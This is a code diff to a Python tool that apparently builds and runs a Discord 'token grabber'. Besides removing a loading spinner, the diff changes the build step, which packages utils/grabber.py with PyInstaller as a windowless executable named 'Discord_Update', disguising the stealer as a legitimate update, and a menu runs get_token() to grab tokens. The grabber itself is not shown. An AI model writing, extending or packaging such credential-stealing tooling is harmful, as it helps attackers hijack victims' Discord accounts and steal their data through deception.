@@ -188,12 +188,8 @@ def debug_json(data, indent=6, color=(180,180,180)):
         print(ansi + prefix + data + RESET)
 
 def loading_spinner():
-    frames = ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"]
-    for frame in frames:
-        sys.stdout.write(f'\r{rgb(192,0,0)}{center(f"Loading {frame}")}{RESET}')
-        sys.stdout.flush()
-        time.sleep(0.08)
-    print()
+    # Entfernt - keine Animation mehr
+    pass
 
 def get_multiline_input(prompt):
     print(center(prompt + " (Finish with an empty line):"))
@@ -260,7 +256,6 @@ def send_to_webhook(webhook_url, message, tts=False, debug=False):
         status_message = "Sending message..."
         print_banner()
         pretty_print("Sending message...", (255,0,64))
-        loading_spinner()
         webhook = DiscordWebhook(url=webhook_url, content=message, tts=tts)
         response = webhook.execute()
         if debug:
@@ -458,27 +453,36 @@ def compile_grabber_menu():
             install_cmd = [sys.executable, '-m', 'pip', 'install', 'pyinstaller']
             subprocess.run(install_cmd, check=True)
 
-        loading_spinner()
-
         output_dir = os.path.join(os.getcwd(), 'compiled')
         if not os.path.exists(output_dir):
             os.makedirs(output_dir)
 
         pretty_print("Building executable with PyInstaller...", (255,128,0))
-        compile_cmd = [
-            sys.executable, '-m', 'PyInstaller',
-            '--onefile',
-            '--noconsole',
-            '--icon=utils/icon.ico',
-            '--name=Discord_Update',
-            '--distpath=' + output_dir,
-            '--hidden-import=PIL._tkinter_finder',
-            '--hidden-import=PIL.Image',
-            '--hidden-import=PIL.ImageGrab',
-            '--hidden-import=psutil',
-            '--hidden-import=sqlite3',
-            'utils/grabber.py'
-        ]
+        # Prüfe ob eine .spec Datei existiert
+        spec_file = 'Discord_Update.spec'
+        if os.path.exists(spec_file):
+            compile_cmd = [
+                sys.executable, '-m', 'PyInstaller',
+                '--distpath=' + output_dir,
+                spec_file
+            ]
+        else:
+            compile_cmd = [
+                sys.executable, '-m', 'PyInstaller',
+                '--onefile',
+                '--noconsole',
+                '--icon=utils/icon.ico',
+                '--name=Discord_Update',
+                '--distpath=' + output_dir,
+                '--hidden-import=PIL._tkinter_finder',
+                '--hidden-import=PIL.Image',
+                '--hidden-import=PIL.ImageGrab',
+                '--hidden-import=psutil',
+                '--hidden-import=sqlite3',
+                '--hidden-import=utils.config',
+                '--add-data=utils/config.py;.',
+                'utils/grabber.py'
+            ]
 
         subprocess.run(compile_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
@@ -519,7 +523,6 @@ def grabber_menu():
 
             print_banner()
             pretty_print("Running token grabber...", (255,128,0))
-            loading_spinner()
             result = get_token()
             if result:
                 pretty_print("✓ Token grabber executed successfully!", (0,255,0))
